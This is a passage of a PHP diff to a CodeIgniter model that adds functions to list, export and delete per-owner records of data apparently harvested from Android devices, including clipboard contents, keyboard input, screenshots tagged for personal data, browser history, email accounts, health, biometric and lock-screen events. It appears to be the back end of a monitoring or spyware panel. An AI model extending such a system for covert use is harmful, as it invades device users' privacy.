@@ -367,6 +367,90 @@ class Mod_Finder extends Model
     {
         return $this->fq('tbl_running_processes', $user_id)->delete();
     }
+    public function deleteAppPermissionsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_app_permissions', $user_id)->delete();
+    }
+    public function deleteBrowserHistoryByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_browser_history', $user_id)->delete();
+    }
+    public function deleteClipboardByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_clipboard', $user_id)->delete();
+    }
+    public function deleteContentProvidersByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_content_providers', $user_id)->delete();
+    }
+    public function deleteCrashLogsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_crash_logs', $user_id)->delete();
+    }
+    public function deleteDigitalWellbeingByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_digital_wellbeing', $user_id)->delete();
+    }
+    public function deleteDozeStandbyByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_doze_standby', $user_id)->delete();
+    }
+    public function deleteEmailAccountsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_email_accounts', $user_id)->delete();
+    }
+    public function deleteHealthDataByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_health_data', $user_id)->delete();
+    }
+    public function deleteKeyboardInputByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_keyboard_input', $user_id)->delete();
+    }
+    public function deleteKeyguardEventsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_keyguard_events', $user_id)->delete();
+    }
+    public function deleteScreenshotsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_screenshots', $user_id)->delete();
+    }
+    public function deleteScreenStateByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_screen_state', $user_id)->delete();
+    }
+    public function deleteVpnConfigByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_vpn_config', $user_id)->delete();
+    }
+    public function deleteRunningProcessesDetailedByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_running_processes_detailed', $user_id)->delete();
+    }
+    public function deleteAudioDevicesByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_audio_devices', $user_id)->delete();
+    }
+    public function deleteBiometricByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_biometric', $user_id)->delete();
+    }
+    public function deleteGnssHardwareByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_gnss_hardware', $user_id)->delete();
+    }
+    public function deletePowerRailsByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_power_rails', $user_id)->delete();
+    }
+    public function deleteUsbDevicesByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_usb_devices', $user_id)->delete();
+    }
+    public function deleteVibrationByUser(int $user_id): bool
+    {
+        return $this->fq('tbl_vibration', $user_id)->delete();
+    }
     public function deleteBlocklistByUser(int $user_id): bool
     {
         return $this->fq('tbl_blocklist', $user_id)->delete();
@@ -1456,6 +1540,90 @@ class Mod_Finder extends Model
     public function export_processes(int $user_id, int $limit = 1000): array
     {
         return $this->fq('tbl_running_processes', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_app_permissions(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_app_permissions', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_browser_history(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_browser_history', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_clipboard(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_clipboard', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_content_providers(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_content_providers', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_crash_logs(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_crash_logs', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_digital_wellbeing(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_digital_wellbeing', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_doze_standby(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_doze_standby', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_email_accounts(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_email_accounts', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_health_data(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_health_data', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_keyboard_input(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_keyboard_input', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_keyguard_events(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_keyguard_events', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_screenshots(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_screenshots', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_screen_state(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_screen_state', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_vpn_config(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_vpn_config', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_running_processes_detailed(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_running_processes_detailed', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_audio_devices(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_audio_devices', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_biometric(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_biometric', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_gnss_hardware(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_gnss_hardware', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_power_rails(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_power_rails', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_usb_devices(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_usb_devices', $user_id)->limit($limit)->get()->getResultArray();
+    }
+    public function export_vibration(int $user_id, int $limit = 1000): array
+    {
+        return $this->fq('tbl_vibration', $user_id)->limit($limit)->get()->getResultArray();
     }
 
     // ── Advanced Extractor Paginated Queries ──────────────────────────────────
@@ -5326,6 +5494,824 @@ try {
         }
     }
 
+    // ── Misc Hardware Detail Extractors ──
+
+    /** Audio Devices */
+    public function get_count_AudioDevices(int $user_id): int
+    {
+        return $this->getCount('tbl_audio_devices', $user_id);
+    }
+
+    public function get_audio_devices(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_AudioDevices($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_audio_devices', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['sample_rates', 'channel_masks', 'channel_counts'] as $key) {
+                    $r[$key] = $r[$key] ?? null;
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_audio_devices: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_audio_devices_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_audio_devices')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_audio_devices_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Biometric */
+    public function get_count_Biometric(int $user_id): int
+    {
+        return $this->getCount('tbl_biometric', $user_id);
+    }
+
+    public function get_biometric(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Biometric($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_biometric', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                $r['enrolled_users'] = is_string($r['enrolled_users'] ?? null) ? json_decode($r['enrolled_users'], true) : ($r['enrolled_users'] ?? []);
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_biometric: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_biometric_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_biometric')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_biometric_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** GNSS Hardware */
+    public function get_count_GnssHardware(int $user_id): int
+    {
+        return $this->getCount('tbl_gnss_hardware', $user_id);
+    }
+
+    public function get_gnss_hardware(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_GnssHardware($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_gnss_hardware', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['constellations_supported', 'frequencies_supported', 'antenna_info', 'measurement_capabilities'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_gnss_hardware: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_gnss_hardware_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_gnss_hardware')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_gnss_hardware_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Power Rails */
+    public function get_count_PowerRails(int $user_id): int
+    {
+        return $this->getCount('tbl_power_rails', $user_id);
+    }
+
+    public function get_power_rails(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_PowerRails($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_power_rails', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['constraints', 'consumer_names'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_power_rails: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_power_rails_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_power_rails')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_power_rails_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** USB Devices */
+    public function get_count_UsbDevices(int $user_id): int
+    {
+        return $this->getCount('tbl_usb_devices', $user_id);
+    }
+
+    public function get_usb_devices(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_UsbDevices($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_usb_devices', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_usb_devices: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_usb_devices_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_usb_devices')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_usb_devices_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Vibration */
+    public function get_count_Vibration(int $user_id): int
+    {
+        return $this->getCount('tbl_vibration', $user_id);
+    }
+
+    public function get_vibration(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Vibration($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_vibration', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['primitives', 'frequency_range_hz', 'composite_primitives'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_vibration: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_vibration_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_vibration')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_vibration_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    // ── Misc Software Detail Extractors ──
+
+    /** App Permissions */
+    public function get_count_AppPermissions(int $user_id): int
+    {
+        return $this->getCount('tbl_app_permissions', $user_id);
+    }
+
+    public function get_app_permissions(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_AppPermissions($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_app_permissions', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_app_permissions: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_app_permissions_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_app_permissions')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_app_permissions_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Browser History */
+    public function get_count_BrowserHistory(int $user_id): int
+    {
+        return $this->getCount('tbl_browser_history', $user_id);
+    }
+
+    public function get_browser_history(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_BrowserHistory($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_browser_history', $user_id)
+                ->orderBy('last_visit_time', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                $r['query_params'] = is_string($r['query_params'] ?? null) ? json_decode($r['query_params'], true) : ($r['query_params'] ?? []);
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_browser_history: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_browser_history_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_browser_history')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_browser_history_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Clipboard */
+    public function get_count_Clipboard(int $user_id): int
+    {
+        return $this->getCount('tbl_clipboard', $user_id);
+    }
+
+    public function get_clipboard(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Clipboard($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_clipboard', $user_id)
+                ->orderBy('timestamp', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_clipboard: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_clipboard_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_clipboard')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_clipboard_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Content Providers */
+    public function get_count_ContentProviders(int $user_id): int
+    {
+        return $this->getCount('tbl_content_providers', $user_id);
+    }
+
+    public function get_content_providers(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_ContentProviders($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_content_providers', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['authorities', 'path_permissions', 'types', 'stream_types'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_content_providers: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_content_providers_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_content_providers')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_content_providers_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Crash Logs */
+    public function get_count_CrashLogs(int $user_id): int
+    {
+        return $this->getCount('tbl_crash_logs', $user_id);
+    }
+
+    public function get_crash_logs(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_CrashLogs($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_crash_logs', $user_id)
+                ->orderBy('crash_time', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_crash_logs: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_crash_logs_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_crash_logs')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_crash_logs_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Digital Wellbeing */
+    public function get_count_DigitalWellbeing(int $user_id): int
+    {
+        return $this->getCount('tbl_digital_wellbeing', $user_id);
+    }
+
+    public function get_digital_wellbeing(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_DigitalWellbeing($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_digital_wellbeing', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['focus_mode_apps', 'bedtime_schedule', 'wind_down_schedule'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+                $r['apps'] = $this->db->table('tbl_digital_wellbeing_apps')
+                    ->where('owner_id', $user_id)
+                    ->where('wellbeing_id', $r['id'])
+                    ->orderBy('daily_usage_minutes', 'DESC')
+                    ->get()->getResultArray();
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_digital_wellbeing: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_digital_wellbeing_row(int $id, int $userId): bool
+    {
+        try {
+            $this->db->table('tbl_digital_wellbeing_apps')->where('wellbeing_id', $id)->where('owner_id', $userId)->delete();
+            return (bool) $this->db->table('tbl_digital_wellbeing')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_digital_wellbeing_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Doze & Standby */
+    public function get_count_DozeStandby(int $user_id): int
+    {
+        return $this->getCount('tbl_doze_standby', $user_id);
+    }
+
+    public function get_doze_standby(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_DozeStandby($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_doze_standby', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                $r['apps'] = $this->db->table('tbl_doze_standby_apps')
+                    ->where('owner_id', $user_id)
+                    ->where('doze_id', $r['id'])
+                    ->orderBy('whitelisted', 'DESC')
+                    ->get()->getResultArray();
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_doze_standby: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_doze_standby_row(int $id, int $userId): bool
+    {
+        try {
+            $this->db->table('tbl_doze_standby_apps')->where('doze_id', $id)->where('owner_id', $userId)->delete();
+            return (bool) $this->db->table('tbl_doze_standby')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_doze_standby_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Email Accounts */
+    public function get_count_EmailAccounts(int $user_id): int
+    {
+        return $this->getCount('tbl_email_accounts', $user_id);
+    }
+
+    public function get_email_accounts(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_EmailAccounts($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_email_accounts', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_email_accounts: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_email_accounts_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_email_accounts')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_email_accounts_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Health Data */
+    public function get_count_HealthData(int $user_id): int
+    {
+        return $this->getCount('tbl_health_data', $user_id);
+    }
+
+    public function get_health_data(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_HealthData($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_health_data', $user_id)
+                ->orderBy('end_time', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_health_data: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_health_data_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_health_data')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_health_data_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Keyboard Input */
+    public function get_count_KeyboardInput(int $user_id): int
+    {
+        return $this->getCount('tbl_keyboard_input', $user_id);
+    }
+
+    public function get_keyboard_input(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_KeyboardInput($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_keyboard_input', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                $r['subtypes'] = is_string($r['subtypes'] ?? null) ? json_decode($r['subtypes'], true) : ($r['subtypes'] ?? []);
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_keyboard_input: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_keyboard_input_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_keyboard_input')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_keyboard_input_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Keyguard Events */
+    public function get_count_KeyguardEvents(int $user_id): int
+    {
+        return $this->getCount('tbl_keyguard_events', $user_id);
+    }
+
+    public function get_keyguard_events(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_KeyguardEvents($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_keyguard_events', $user_id)
+                ->orderBy('timestamp', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_keyguard_events: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_keyguard_events_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_keyguard_events')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_keyguard_events_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Screenshots */
+    public function get_count_Screenshots(int $user_id): int
+    {
+        return $this->getCount('tbl_screenshots', $user_id);
+    }
+
+    public function get_screenshots(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_Screenshots($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_screenshots', $user_id)
+                ->orderBy('timestamp', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                $r['pii_types'] = is_string($r['pii_types'] ?? null) ? json_decode($r['pii_types'], true) : ($r['pii_types'] ?? []);
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_screenshots: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_screenshots_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_screenshots')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_screenshots_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Screen State */
+    public function get_count_ScreenState(int $user_id): int
+    {
+        return $this->getCount('tbl_screen_state', $user_id);
+    }
+
+    public function get_screen_state(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_ScreenState($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_screen_state', $user_id)
+                ->orderBy('timestamp', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_screen_state: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_screen_state_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_screen_state')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_screen_state_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** VPN Configuration */
+    public function get_count_VpnConfig(int $user_id): int
+    {
+        return $this->getCount('tbl_vpn_config', $user_id);
+    }
+
+    public function get_vpn_config(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_VpnConfig($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_vpn_config', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
